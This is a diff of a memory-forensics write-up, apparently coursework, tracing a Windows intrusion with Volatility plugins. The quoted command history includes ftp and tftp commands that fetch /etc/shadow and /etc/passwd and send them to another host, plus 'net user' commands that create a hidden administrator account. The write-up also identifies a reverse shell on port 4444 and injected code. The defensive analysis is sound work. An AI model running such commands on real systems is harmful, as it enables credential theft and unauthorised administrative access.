@@ -3,49 +3,74 @@
 
 Using plugins `cmdscan` and `consoles` we found evidence of an attacker trying to create a new user and add it to the local administrators group. The attacker also tried to exfiltrate the `shadow` and `passwd` files using `ftp` and `tftp` commands.
 
-These commands were run by a child of `csrss.exe` (Pid 684), here is an extract of these commands :
+These commands were run by a child of `csrss.exe` (Pid 684), here is an extract of these commands (mix of `cmdscan` and `consoles`) :
 
 ```
 **************************************************
 CommandProcess: csrss.exe Pid: 684
 CommandHistory: 0x10986f8 Application: cmd.exe Flags: Allocated, Reset
-CommandCount: 9 LastAdded: 8 LastDisplayed: 8
-FirstCommand: 0 CommandCountMax: 50
-ProcessHandle: 0x5b4
 **************************************************
 cd C:\
 mkdir system32
 cd system32
 ftp 192.168.174.128
+
+Connected to 192.168.174.128.                                                   
+220 ProFTPD 1.3.4a Server (Debian) [::ffff:192.168.174.128]                     
+User (192.168.174.128:(none)): root                                             
+331 Password required for root                                                  
+Password:                                                                       
+230 User root logged in                                                         
+ftp> get /etc/shadow                                                            
+200 PORT command successful                                                     
+150 Opening ASCII mode data connection for /etc/shadow (866 bytes)              
+226 Transfer complete                                                           
+ftp: 891 bytes received in 0.02Seconds 55.69Kbytes/sec.                         
+ftp> get /etc/passwd                                                            
+200 PORT command successful                                                     
+150 Opening ASCII mode data connection for /etc/passwd (1033 bytes)             
+226 Transfer complete                                                           
+ftp: 1058 bytes received in 0.00Seconds 1058000.00Kbytes/sec.                                                                               
+ftp> quit                                                                       
+221 Goodbye.    
+
 tftp 192.168.1.104 put shadow
+Transfer successful: 891 bytes in 1 second, 891 bytes/s
+
 tftp 192.168.1.104 put passwd
-net user admin * /add 
-net localground Administrators admin /add #OOOPS
+Transfer successful: 1058 bytes in 1 second, 1058 bytes/s   
+
+net user admin * /add
+Type a password for the user:                                                   
+Retype the password to confirm:                                                 
+The command completed successfully.
+
 net localgroup Administrators admin /add
+The command completed successfully.  
 ```
 
 Using `pstree` we can see that a `cmd.exe` is running as a child of `svchost.exe` (Pid 1136) which is a child of our `csrss.exe` (Pid 684).
 
 ```
-Name                                                  Pid   PPid   Thds   Hnds Time
--------------------------------------------------- ------ ------ ------ ------ ----
-.. 0x89953020:csrss.exe                               684    620     11    409 2013-08-15 22:55:10 UTC+0000
-.. 0x8969f020:winlogon.exe                            708    620     22    522 2013-08-15 22:55:10 UTC+0000
-... 0x8998b680:wpabaln.exe                           1428    708      1     58 2013-08-15 22:57:13 UTC+0000
-... 0x8994dca8:services.exe                           752    708     16    268 2013-08-15 22:55:10 UTC+0000
-.... 0x895213c0:svchost.exe                           132    752      6     88 2013-08-15 22:55:31 UTC+0000
-.... 0x8989a980:vmtoolsd.exe                          272    752      8    268 2013-08-15 22:55:32 UTC+0000
-.... 0x8994f458:vmacthlp.exe                          924    752      1     25 2013-08-15 22:55:10 UTC+0000
-.... 0x899a1a00:svchost.exe                          1184    752      6     70 2013-08-15 22:55:12 UTC+0000
-.... 0x89b60998:svchost.exe                          1284    752     14    195 2013-08-15 22:55:12 UTC+0000
-.... 0x896a1b10:svchost.exe                           936    752     19    202 2013-08-15 22:55:11 UTC+0000
-.... 0x895e9618:svchost.exe                           996    752     10    238 2013-08-15 22:55:11 UTC+0000
-.... 0x89679608:alg.exe                              1768    752      6    101 2013-08-15 22:55:40 UTC+0000
-.... 0x89a54650:spoolsv.exe                          1644    752     14    145 2013-08-15 22:55:13 UTC+0000
-.... 0x89a90da0:svchost.exe                          1136    752     68   4423 2013-08-15 22:55:11 UTC+0000
-..... 0x89985c08:wscntfy.exe                         1588   1136      1     28 2013-08-15 22:55:40 UTC+0000
-..... 0x8950a020:cmd.exe                              440   1136      1     33 2013-08-15 22:56:01 UTC+0000
-..... 0x8992fb08:wmiadap.exe                          364   1136      5    172 2013-08-15 22:59:40 UTC+0000
+Name                                  Pid   PPid   Thds   Hnds
+----------------------------------- ------ ------ ------ ------
+.. 0x89953020:csrss.exe                684    620     11    409
+.. 0x8969f020:winlogon.exe             708    620     22    522
+... 0x8998b680:wpabaln.exe            1428    708      1     58
+... 0x8994dca8:services.exe            752    708     16    268
+.... 0x895213c0:svchost.exe            132    752      6     88
+.... 0x8989a980:vmtoolsd.exe           272    752      8    268
+.... 0x8994f458:vmacthlp.exe           924    752      1     25
+.... 0x899a1a00:svchost.exe           1184    752      6     70
+.... 0x89b60998:svchost.exe           1284    752     14    195
+.... 0x896a1b10:svchost.exe            936    752     19    202
+.... 0x895e9618:svchost.exe            996    752     10    238
+.... 0x89679608:alg.exe               1768    752      6    101
+.... 0x89a54650:spoolsv.exe           1644    752     14    145
+.... 0x89a90da0:svchost.exe           1136    752     68   4423
+..... 0x89985c08:wscntfy.exe          1588   1136      1     28
+..... 0x8950a020:cmd.exe               440   1136      1     33
+..... 0x8992fb08:wmiadap.exe           364   1136      5    172
 
 ```
 
@@ -55,11 +80,11 @@ Looking at the network connections using `sockets` we can see that the `svchost.
 
 ```
 
-Offset(V)       PID   Port  Proto Protocol        Address         Create Time
----------- -------- ------ ------ --------------- --------------- -----------
-0x896b87c0     1136    123     17 UDP             192.168.174.148 2013-08-15 22:55:40 UTC+0000
-0x896e36d8     1136    123     17 UDP             127.0.0.1       2013-08-15 22:55:40 UTC+0000
-0x898ad978     1136   4444      6 TCP             0.0.0.0         2013-08-15 22:56:00 UTC+0000
+Offset(V)       PID   Port  Proto Protocol        Address        
+---------- -------- ------ ------ --------------- ---------------
+0x896b87c0     1136    123     17 UDP             192.168.174.148
+0x896e36d8     1136    123     17 UDP             127.0.0.1      
+0x898ad978     1136   4444      6 TCP             0.0.0.0        
 
 ```
 
@@ -70,9 +95,9 @@ From now we can assume that it is most likely a reverse shell, so we can use `co
 Here you go...
 
 ```
-Offset(V)  Local Address             Remote Address            Pid
----------- ------------------------- ------------------------- ---
-0x8966bd30 192.168.174.148:4444      192.168.174.1:58719       1136
+Offset(V)  Local Address          Remote Address       Pid
+---------- ---------------------- -------------------- ---
+0x8966bd30 192.168.174.148:4444   192.168.174.1:58719  1136
 
 ````
 
@@ -91,20 +116,20 @@ Process: svchost.exe Pid: 1136 Address: 0x2df0000
 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE
 Flags: CommitCharge: 109, MemCommit: 1, PrivateMemory: 1, Protection: 6
 
-0x0000000002df0000  4d 5a e8 00 00 00 00 5b 52 45 55 89 e5 81 c3 89   MZ.....[REU.....
-0x0000000002df0010  0e 00 00 ff d3 89 c3 57 68 04 00 00 00 50 ff d0   .......Wh....P..
-0x0000000002df0020  68 e0 1d 2a 0a 68 05 00 00 00 50 ff d3 00 00 00   h..*.h....P.....
-0x0000000002df0030  00 00 00 00 00 00 00 00 00 00 00 00 f0 00 00 00   ................
+4d 5a e8 00 00 00 00 5b 52 45 55 89 e5 81 c3 89   MZ.....[REU.....
+0e 00 00 ff d3 89 c3 57 68 04 00 00 00 50 ff d0   .......Wh....P..
+68 e0 1d 2a 0a 68 05 00 00 00 50 ff d3 00 00 00   h..*.h....P.....
+00 00 00 00 00 00 00 00 00 00 00 00 f0 00 00 00   ................
 
 ```
 
 Based on the criteria seen in class :
 
-* Full commited page -> YES
-* RWX page -> YES
-* Private memory -> YES
-* No mapped file (VadS) -> YES
-* MZ header -> YES
+* Full commited page \checkmark
+* RWX page \checkmark
+* Private memory \checkmark
+* No mapped file (VadS) \checkmark
+* MZ header \checkmark
 
 So `svchost.exe` (Pid 1136) is no more a suspicious process, it is most likely a malicious one.
 
